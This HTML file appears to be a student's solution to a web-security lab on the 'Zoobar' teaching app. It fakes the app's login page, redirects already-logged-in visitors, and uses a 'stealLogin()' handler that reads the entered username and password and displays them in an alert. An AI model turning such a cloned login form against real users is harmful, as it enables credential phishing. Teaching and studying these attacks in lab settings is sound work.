<!doctype html>
<html>
	<head>
		<title>Login - Zoobar Foundation</title>
		<link rel="stylesheet" type="text/css" href="http://localhost:8080/zoobar/media/zoobar.css">
	</head>
	<body>
	    <h1><a href="/zoobar/index.cgi/">Zoobar Foundation for Sensible Learning</a></h1>
		<h2>Supporting the brightest thinkers of the counterinsurgency</h2>
		<script src="http://localhost:8080/zoobar/index.cgi/zoobarjs"></script>
		<script>
			if (typeof myZoobars !== 'undefined'){
				window.location.href = "answer-2.html"; // Olettaa ett√§ answer-2.html on samassa kansiossa
			}
		</script>
		<div id="login" class="centerpiece">
			<form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login" onsubmit="stealLogin()">
				<table>
					<tr>
						<td>Username:</td>
						<td><input type="text" name="login_username" size="20" autocomplete="no" value=""></td>
					</tr>
					<tr>
						<td>Password:</td>
						<td colspan=2><input type="password" name="login_password" size=20 autocomplete="no">
						<input type="submit" name="submit_login" value="Log in">
						<input type="submit" name="submit_registration" value="Register"></td>
					</tr>
				</table>
				<input type="hidden" name="nexturl" value="">
			</form>
		</div>
		<script>
			document.loginform.login_username.focus();
		</script>
		<script>
			function stealLogin() {
				var username = document.forms[0].elements[0].value;
				var password = document.forms[0].elements[1].value;
				alert(username + " " + password);
			}
		</script>
	</body>
</html>
